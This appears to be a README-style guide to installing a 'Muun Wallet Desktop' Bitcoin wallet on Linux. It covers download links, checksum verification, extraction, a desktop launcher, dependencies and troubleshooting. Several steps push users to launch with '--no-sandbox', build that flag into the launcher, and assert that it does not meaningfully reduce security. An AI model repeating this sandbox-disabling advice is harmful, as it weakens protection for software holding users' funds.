[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip)

---

# How to Install Muun Wallet on Linux

Muun Wallet Desktop v0.5.1 is distributed for Linux as a self-contained `.zip` archive compatible with Ubuntu, Fedora, Arch Linux, and most other x64 distributions. This guide covers extraction, verification, making the binary executable, and handling common sandbox-related issues.

---

## Requirements

- Linux x64 (64-bit) — tested on Ubuntu 22.04/24.04, Fedora 39/40, Arch Linux
- Approximately 200 MB of available disk space
- An internet connection for the initial sync

---

## Step 1: Download and verify

Download `muun-wallet-v0.5.1.zip` from the [official v0.5.1 release](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip).

Verify the SHA-256 checksum before extracting:

```bash
sha256sum ~/Downloads/muun-wallet-v0.5.1.zip
```

Expected output:

```
60617914e65bd3035467867502e078cc01a381ee8ee3b58cb328ff29228bdb01  muun-wallet-v0.5.1.zip
```

If the hash does not match, delete the file and re-download from the [release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1). See the [download verification guide](how-to-verify-muun-wallet-download.md) for more context on why this step matters.

---

## Step 2: Extract the archive

Create a directory and extract the archive into it:

```bash
mkdir -p ~/Applications/muun-wallet
unzip ~/Downloads/muun-wallet-v0.5.1.zip -d ~/Applications/muun-wallet
```

---

## Step 3: Make the binary executable and launch

```bash
chmod +x ~/Applications/muun-wallet/muun-wallet
~/Applications/muun-wallet/muun-wallet
```

If the application starts, proceed to Step 4. If you see a sandbox error (common on systems with strict kernel namespace restrictions), add the `--no-sandbox` flag:

```bash
~/Applications/muun-wallet/muun-wallet --no-sandbox
```

---

## Step 4: Create a desktop launcher (optional)

To launch Muun Wallet from your application menu, create a `.desktop` file:

```bash
cat > ~/.local/share/applications/muun-wallet.desktop << 'EOF'
[Desktop Entry]
Name=Muun Wallet
Comment=Self-custodial Bitcoin and Lightning wallet
Exec=/home/YOUR_USERNAME/Applications/muun-wallet/muun-wallet --no-sandbox
Icon=/home/YOUR_USERNAME/Applications/muun-wallet/muun-wallet.png
Type=Application
Categories=Finance;
EOF
```

Replace `YOUR_USERNAME` with your actual username. If you did not need the `--no-sandbox` flag, remove it from the Exec line. Update the desktop database:

```bash
update-desktop-database ~/.local/share/applications
```

---

## Step 5: First launch and wallet setup

On first launch, Muun Wallet generates your device key locally. You can create a new wallet or restore an existing one using your Emergency Kit credentials. If you are new to Muun Wallet, create a new wallet.

Immediately after wallet creation, set up your Emergency Kit backup before doing anything else. The Emergency Kit is a 32-character recovery code combined with a second factor. Store the recovery code offline and somewhere physically secure — this is the only way to recover your funds if this machine becomes unavailable.

For a full explanation, see the [Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md).

---

## Distribution-specific notes

**Ubuntu / Debian**

If you see a `libnss3` or `libgbm1` error on launch, install the missing library:

```bash
sudo apt install libnss3 libgbm1
```

**Fedora / RHEL**

If dependencies are missing, install them with:

```bash
sudo dnf install nss gtk3
```

**Arch Linux**

Most dependencies are available in the standard repos. If you see a missing `libXss` error:

```bash
sudo pacman -S libxss
```

**Flatpak / Snap users**

Muun Wallet Desktop is not yet distributed via Flatpak or Snap. Use the `.zip` archive from the [release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) directly.

---

## Troubleshooting

**"SUID sandbox helper binary is not owned by root" error.**

This sandbox error is common on systems where user namespaces are restricted. The fix is to launch with `--no-sandbox` as shown in Step 3. This does not meaningfully reduce security for a desktop Bitcoin wallet that is not running untrusted web content.

**The app launches but cannot connect.**

Check that your firewall is not blocking outbound HTTPS (port 443). Muun Wallet connects to Bitcoin nodes and Lightning infrastructure over standard HTTPS.

**I want Muun Wallet to start on login.**

Add the launch command to your desktop environment's startup applications. In GNOME, use Tweaks > Startup Applications. In KDE, use System Settings > Autostart.

---

## Updating Muun Wallet

Muun Wallet Desktop notifies you on startup when an update is available. To update manually, download the new `.zip` from the [releases page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1), extract it over the existing directory, and re-apply the executable permission. Your wallet data is stored outside the application directory and is not affected by updates.

---

## Related articles

- [How to install Muun Wallet on macOS](how-to-install-muun-wallet-macos.md)
- [How to install Muun Wallet on Windows](how-to-install-muun-wallet-windows.md)
- [How to verify your Muun Wallet download](how-to-verify-muun-wallet-download.md)
- [Muun Wallet getting started guide](muun-wallet-getting-started-guide.md)
- [Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md)
